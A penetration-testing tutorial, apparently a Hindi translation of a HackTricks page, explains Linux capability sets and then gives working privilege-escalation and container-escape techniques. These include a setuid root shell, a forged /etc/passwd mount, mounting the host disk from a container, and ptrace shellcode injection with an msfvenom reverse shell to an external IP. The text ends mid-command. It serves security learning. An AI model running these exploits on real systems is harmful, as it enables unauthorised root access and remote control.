# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Linux capabilities **रूट विशेषाधिकारों को छोटे, विशिष्ट इकाइयों में विभाजित** करती हैं, जिससे प्रक्रियाओं को विशेषाधिकारों का एक उपसमुच्चय प्राप्त होता है। यह पूर्ण रूट विशेषाधिकारों को अनावश्यक रूप से प्रदान न करके जोखिमों को कम करता है।

### समस्या:

- सामान्य उपयोगकर्ताओं के पास सीमित अनुमतियाँ होती हैं, जो नेटवर्क सॉकेट खोलने जैसे कार्यों को प्रभावित करती हैं, जिसके लिए रूट एक्सेस की आवश्यकता होती है।

### क्षमता सेट:

1. **Inherited (CapInh)**:

- **उद्देश्य**: यह निर्धारित करता है कि कौन सी क्षमताएँ माता-पिता प्रक्रिया से नीचे दी गई हैं।
- **कार्यप्रणाली**: जब एक नई प्रक्रिया बनाई जाती है, तो यह इस सेट में अपने माता-पिता से क्षमताएँ विरासत में लेती है। प्रक्रिया स्पॉन्स के बीच कुछ विशेषाधिकार बनाए रखने के लिए उपयोगी।
- **प्रतिबंध**: एक प्रक्रिया उन क्षमताओं को प्राप्त नहीं कर सकती जो उसके माता-पिता के पास नहीं थीं।

2. **Effective (CapEff)**:

- **उद्देश्य**: यह दर्शाता है कि किसी प्रक्रिया द्वारा किसी भी क्षण में वास्तविक क्षमताएँ क्या हैं।
- **कार्यप्रणाली**: यह क्षमताओं का सेट है जिसे विभिन्न संचालन के लिए अनुमति देने के लिए कर्नेल द्वारा जांचा जाता है। फ़ाइलों के लिए, यह सेट एक ध्वज हो सकता है जो यह इंगित करता है कि फ़ाइल की अनुमत क्षमताएँ प्रभावी मानी जाएँगी या नहीं।
- **महत्व**: प्रभावी सेट तात्कालिक विशेषाधिकार जांचों के लिए महत्वपूर्ण है, यह एक प्रक्रिया द्वारा उपयोग की जाने वाली क्षमताओं का सक्रिय सेट के रूप में कार्य करता है।

3. **Permitted (CapPrm)**:

- **उद्देश्य**: यह अधिकतम सेट को परिभाषित करता है जो एक प्रक्रिया रख सकती है।
- **कार्यप्रणाली**: एक प्रक्रिया अनुमत सेट से एक क्षमता को प्रभावी सेट में बढ़ा सकती है, जिससे उसे उस क्षमता का उपयोग करने की अनुमति मिलती है। यह अपनी अनुमत सेट से क्षमताएँ भी हटा सकती है।
- **सीमा**: यह एक प्रक्रिया के पास होने वाली क्षमताओं के लिए एक ऊपरी सीमा के रूप में कार्य करता है, यह सुनिश्चित करता है कि एक प्रक्रिया अपने पूर्वनिर्धारित विशेषाधिकार दायरे से अधिक न जाए।

4. **Bounding (CapBnd)**:

- **उद्देश्य**: यह एक प्रक्रिया के जीवनकाल के दौरान कभी भी प्राप्त की जा सकने वाली क्षमताओं पर एक छत लगाता है।
- **कार्यप्रणाली**: भले ही एक प्रक्रिया के पास अपनी विरासत में ली गई या अनुमत सेट में एक निश्चित क्षमता हो, वह उस क्षमता को प्राप्त नहीं कर सकती जब तक कि यह बाउंडिंग सेट में भी न हो।
- **उपयोग का मामला**: यह सेट विशेष रूप से एक प्रक्रिया के विशेषाधिकार वृद्धि की संभावनाओं को प्रतिबंधित करने के लिए उपयोगी है, सुरक्षा की एक अतिरिक्त परत जोड़ता है।

5. **Ambient (CapAmb)**:
- **उद्देश्य**: यह कुछ क्षमताओं को `execve` सिस्टम कॉल के दौरान बनाए रखने की अनुमति देता है, जो सामान्यतः प्रक्रिया की क्षमताओं का पूर्ण रीसेट करेगा।
- **कार्यप्रणाली**: यह सुनिश्चित करता है कि गैर-SUID कार्यक्रम जो संबंधित फ़ाइल क्षमताएँ नहीं रखते हैं, कुछ विशेषाधिकार बनाए रख सकें।
- **प्रतिबंध**: इस सेट में क्षमताएँ विरासत में ली गई और अनुमत सेट की सीमाओं के अधीन होती हैं, यह सुनिश्चित करते हुए कि वे प्रक्रिया के अनुमत विशेषाधिकारों से अधिक न हों।
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
For further information check:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Processes & Binaries Capabilities

### Processes Capabilities

किसी विशेष प्रक्रिया के लिए क्षमताओं को देखने के लिए, /proc निर्देशिका में **status** फ़ाइल का उपयोग करें। चूंकि यह अधिक विवरण प्रदान करता है, आइए इसे केवल Linux क्षमताओं से संबंधित जानकारी तक सीमित करें।\
ध्यान दें कि सभी चल रही प्रक्रियाओं के लिए क्षमता जानकारी प्रति थ्रेड बनाए रखी जाती है, फ़ाइल सिस्टम में बाइनरी के लिए इसे विस्तारित विशेषताओं में संग्रहीत किया जाता है।

आप /usr/include/linux/capability.h में परिभाषित क्षमताएँ पा सकते हैं।

आप वर्तमान प्रक्रिया की क्षमताएँ `cat /proc/self/status` में या `capsh --print` करके और अन्य उपयोगकर्ताओं की `/proc/<pid>/status` में पा सकते हैं।
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
यह कमांड अधिकांश सिस्टम पर 5 पंक्तियाँ लौटानी चाहिए।

- CapInh = विरासत में मिली क्षमताएँ
- CapPrm = अनुमत क्षमताएँ
- CapEff = प्रभावी क्षमताएँ
- CapBnd = बाउंडिंग सेट
- CapAmb = एंबियंट क्षमताओं का सेट
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
ये हेक्साडेसिमल नंबर समझ में नहीं आ रहे हैं। capsh उपयोगिता का उपयोग करके हम इन्हें क्षमताओं के नाम में डिकोड कर सकते हैं।
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
अब हम `ping` द्वारा उपयोग की जाने वाली **capabilities** की जांच करते हैं:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
हालांकि यह काम करता है, एक और आसान तरीका है। चल रहे प्रोसेस की क्षमताओं को देखने के लिए, बस **getpcaps** टूल का उपयोग करें उसके प्रोसेस आईडी (PID) के बाद। आप प्रोसेस आईडी की एक सूची भी प्रदान कर सकते हैं।
```bash
getpcaps 1234
```
आइए यहाँ `tcpdump` की क्षमताओं की जांच करें, जब बाइनरी को नेटवर्क को स्निफ़ करने के लिए पर्याप्त क्षमताएँ (`cap_net_admin` और `cap_net_raw`) दी गई हैं (_tcpdump प्रक्रिया 9562 में चल रहा है_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
जैसा कि आप देख सकते हैं, दिए गए क्षमताएँ बाइनरी की क्षमताओं को प्राप्त करने के 2 तरीकों के परिणामों के साथ मेल खाती हैं।\
_**getpcaps**_ टूल विशेष थ्रेड के लिए उपलब्ध क्षमताओं को क्वेरी करने के लिए **capget()** सिस्टम कॉल का उपयोग करता है। इस सिस्टम कॉल को अधिक जानकारी प्राप्त करने के लिए केवल PID प्रदान करने की आवश्यकता होती है।

### बाइनरी क्षमताएँ

बाइनरी में क्षमताएँ हो सकती हैं जो निष्पादन के दौरान उपयोग की जा सकती हैं। उदाहरण के लिए, `ping` बाइनरी के साथ `cap_net_raw` क्षमता पाना बहुत सामान्य है:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
आप **क्षमताओं के साथ बाइनरीज़ खोज सकते हैं**:
```bash
getcap -r / 2>/dev/null
```
### Dropping capabilities with capsh

यदि हम \_ping* के लिए CAP*NET_RAW क्षमताओं को हटा दें, तो पिंग उपयोगिता को अब काम नहीं करना चाहिए।
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
इसके अलावा _capsh_ के आउटपुट के अलावा, _tcpdump_ कमांड को भी एक त्रुटि उत्पन्न करनी चाहिए।

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

त्रुटि स्पष्ट रूप से दिखाती है कि पिंग कमांड को ICMP सॉकेट खोलने की अनुमति नहीं है। अब हम निश्चित रूप से जानते हैं कि यह अपेक्षित रूप से काम करता है।

### क्षमताएँ हटाएँ

आप एक बाइनरी की क्षमताएँ हटा सकते हैं।
```bash
setcap -r </path/to/binary>
```
## User Capabilities

स्पष्ट रूप से **उपयोगकर्ताओं को क्षमताएँ सौंपना संभव है**। इसका मतलब शायद यह है कि उपयोगकर्ता द्वारा निष्पादित प्रत्येक प्रक्रिया उपयोगकर्ता की क्षमताओं का उपयोग करने में सक्षम होगी।\
[इस](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7) , [इस](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) और [इस](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) के आधार पर कुछ फ़ाइलों को कॉन्फ़िगर करने की आवश्यकता है ताकि एक उपयोगकर्ता को कुछ क्षमताएँ दी जा सकें, लेकिन प्रत्येक उपयोगकर्ता को क्षमताएँ सौंपने वाली फ़ाइल `/etc/security/capability.conf` होगी।\
फ़ाइल का उदाहरण:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Environment Capabilities

निम्नलिखित प्रोग्राम को संकलित करने पर **एक ऐसे वातावरण के अंदर एक bash शेल उत्पन्न करना संभव है जो क्षमताएँ प्रदान करता है**।
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**संकलित परिवेश बाइनरी द्वारा निष्पादित bash** के अंदर **नई क्षमताएँ** देखी जा सकती हैं (एक सामान्य उपयोगकर्ता के पास "वर्तमान" अनुभाग में कोई क्षमता नहीं होगी)।
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> आप **केवल उन क्षमताओं को जोड़ सकते हैं जो** अनुमत और विरासत में मिलने वाले सेट दोनों में मौजूद हैं।

### क्षमता-जानकारी/क्षमता-गूंगे बाइनरी

**क्षमता-जानकारी बाइनरी नए क्षमताओं का उपयोग नहीं करेंगी** जो वातावरण द्वारा दी गई हैं, हालाँकि **क्षमता-गूंगे बाइनरी उनका उपयोग करेंगी** क्योंकि वे उन्हें अस्वीकार नहीं करेंगी। यह क्षमता-गूंगे बाइनरी को एक विशेष वातावरण के भीतर कमजोर बनाता है जो बाइनरी को क्षमताएँ प्रदान करता है।

## सेवा क्षमताएँ

डिफ़ॉल्ट रूप से, **रूट के रूप में चलने वाली सेवा को सभी क्षमताएँ सौंप दी जाएंगी**, और कुछ अवसरों पर यह खतरनाक हो सकता है।\
इसलिए, एक **सेवा कॉन्फ़िगरेशन** फ़ाइल आपको **निर्धारित** करने की अनुमति देती है कि आप इसे कौन सी **क्षमताएँ** देना चाहते हैं, **और** वह **उपयोगकर्ता** जो सेवा को निष्पादित करना चाहिए ताकि अनावश्यक विशेषाधिकारों के साथ सेवा न चलाई जाए:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker कंटेनरों में क्षमताएँ

डिफ़ॉल्ट रूप से, Docker कुछ क्षमताएँ कंटेनरों को असाइन करता है। यह जांचना बहुत आसान है कि ये क्षमताएँ कौन सी हैं, बस चलाकर:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities तब उपयोगी होती हैं जब आप **विशिष्ट कार्यों को करने के बाद अपने स्वयं के प्रक्रियाओं को प्रतिबंधित करना चाहते हैं** (जैसे chroot सेट करने और एक सॉकेट से बाइंड करने के बाद)। हालाँकि, इन्हें दुर्भावनापूर्ण कमांड या तर्कों को पास करके शोषित किया जा सकता है, जिन्हें फिर रूट के रूप में चलाया जाता है।

आप `setcap` का उपयोग करके कार्यक्रमों पर क्षमताएँ लागू कर सकते हैं, और इन्हें `getcap` का उपयोग करके क्वेरी कर सकते हैं:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` का मतलब है कि आप क्षमता जोड़ रहे हैं (“-” इसे हटा देगा) जो प्रभावी और अनुमत है।

सिस्टम या फ़ोल्डर में क्षमताओं वाले कार्यक्रमों की पहचान करने के लिए:
```bash
getcap -r / 2>/dev/null
```
### Exploitation example

In the following example the binary `/usr/bin/python2.6` is found vulnerable to privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** जो `tcpdump` को **किसी भी उपयोगकर्ता को पैकेट स्निफ़ करने की अनुमति देती हैं**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "खाली" क्षमताओं का विशेष मामला

[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): ध्यान दें कि कोई प्रोग्राम फ़ाइल को खाली क्षमता सेट सौंप सकता है, और इस प्रकार एक सेट-यूज़र-आईडी-रूट प्रोग्राम बनाना संभव है जो उस प्रक्रिया के प्रभावी और सहेजे गए सेट-यूज़र-आईडी को 0 में बदलता है जो प्रोग्राम को निष्पादित करता है, लेकिन उस प्रक्रिया को कोई क्षमताएँ नहीं देता। या, सरल शब्दों में, यदि आपके पास एक बाइनरी है जो:

1. रूट द्वारा स्वामित्व में नहीं है
2. जिसमें कोई `SUID`/`SGID` बिट सेट नहीं है
3. जिसमें खाली क्षमताएँ सेट हैं (जैसे: `getcap myelf` `myelf =ep` लौटाता है)

तो **वह बाइनरी रूट के रूप में चलेगी**।

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** एक अत्यधिक शक्तिशाली Linux क्षमता है, जिसे अक्सर इसके व्यापक **प्रशासनिक विशेषाधिकारों** के कारण लगभग-रूट स्तर के बराबर माना जाता है, जैसे कि उपकरणों को माउंट करना या कर्नेल सुविधाओं में हेरफेर करना। जबकि संपूर्ण सिस्टम का अनुकरण करने वाले कंटेनरों के लिए यह अनिवार्य है, **`CAP_SYS_ADMIN` महत्वपूर्ण सुरक्षा चुनौतियाँ प्रस्तुत करता है**, विशेष रूप से कंटेनरयुक्त वातावरण में, इसके विशेषाधिकार वृद्धि और सिस्टम समझौते की संभावनाओं के कारण। इसलिए, इसके उपयोग के लिए कठोर सुरक्षा आकलनों और सतर्क प्रबंधन की आवश्यकता होती है, जिसमें **कम से कम विशेषाधिकार के सिद्धांत** का पालन करने और हमले की सतह को कम करने के लिए एप्लिकेशन-विशिष्ट कंटेनरों में इस क्षमता को छोड़ने की मजबूत प्राथमिकता होती है।

**Example with binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Python का उपयोग करके आप असली _passwd_ फ़ाइल के ऊपर एक संशोधित _passwd_ फ़ाइल माउंट कर सकते हैं:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
और अंत में **mount** करें संशोधित `passwd` फ़ाइल को `/etc/passwd` पर:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
और आप **`su` as root** पासवर्ड "password" का उपयोग करके कर सकेंगे।

**पर्यावरण के साथ उदाहरण (Docker ब्रेकआउट)**

आप docker कंटेनर के अंदर सक्षम क्षमताओं की जांच कर सकते हैं:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
पिछले आउटपुट में आप देख सकते हैं कि SYS_ADMIN क्षमता सक्षम है।

- **Mount**

यह डॉकर कंटेनर को **होस्ट डिस्क को माउंट करने और इसे स्वतंत्र रूप से एक्सेस करने** की अनुमति देता है:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **पूर्ण पहुँच**

पिछले तरीके में हम डॉकर होस्ट डिस्क तक पहुँचने में सफल रहे।\
यदि आप पाते हैं कि होस्ट एक **ssh** सर्वर चला रहा है, तो आप **डॉकर होस्ट** डिस्क के अंदर एक उपयोगकर्ता बना सकते हैं और SSH के माध्यम से उस तक पहुँच सकते हैं:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**इसका मतलब है कि आप होस्ट के अंदर चल रहे किसी प्रक्रिया में शेलकोड इंजेक्ट करके कंटेनर से बाहर निकल सकते हैं।** होस्ट के अंदर चल रही प्रक्रियाओं तक पहुँचने के लिए कंटेनर को कम से कम **`--pid=host`** के साथ चलाना होगा।

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** `ptrace(2)` द्वारा प्रदान की गई डिबगिंग और सिस्टम कॉल ट्रेसिंग कार्यक्षमताओं का उपयोग करने की क्षमता प्रदान करता है और `process_vm_readv(2)` और `process_vm_writev(2)` जैसे क्रॉस-मेमोरी अटैच कॉल्स। हालांकि यह निदान और निगरानी के उद्देश्यों के लिए शक्तिशाली है, यदि `CAP_SYS_PTRACE` को `ptrace(2)` पर प्रतिबंधात्मक उपायों जैसे कि सेकंप फ़िल्टर के बिना सक्षम किया जाता है, तो यह सिस्टम सुरक्षा को महत्वपूर्ण रूप से कमजोर कर सकता है। विशेष रूप से, इसका उपयोग अन्य सुरक्षा प्रतिबंधों को दरकिनार करने के लिए किया जा सकता है, विशेष रूप से उन पर जो सेकंप द्वारा लगाए गए हैं, जैसा कि [इस तरह के प्रमाणों (PoC) द्वारा प्रदर्शित किया गया है](https://gist.github.com/thejh/8346f47e359adecd1d53)।

**Example with binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Example with binary (gdb)**

`gdb` with `ptrace` क्षमता:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
```markdown
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f elf > shell.elf
```

```markdown
gdb -q ./shell.elf
```

```markdown
(gdb) run
```

```markdown
(gdb) x/20x $esp
```

```markdown
(gdb) set {char[<size>]}<address> = <shellcode>
```

```markdown
(gdb) continue
```
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
एक रूट प्रक्रिया को gdb के साथ डिबग करें और पहले से उत्पन्न gdb लाइनों को कॉपी-पेस्ट करें:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
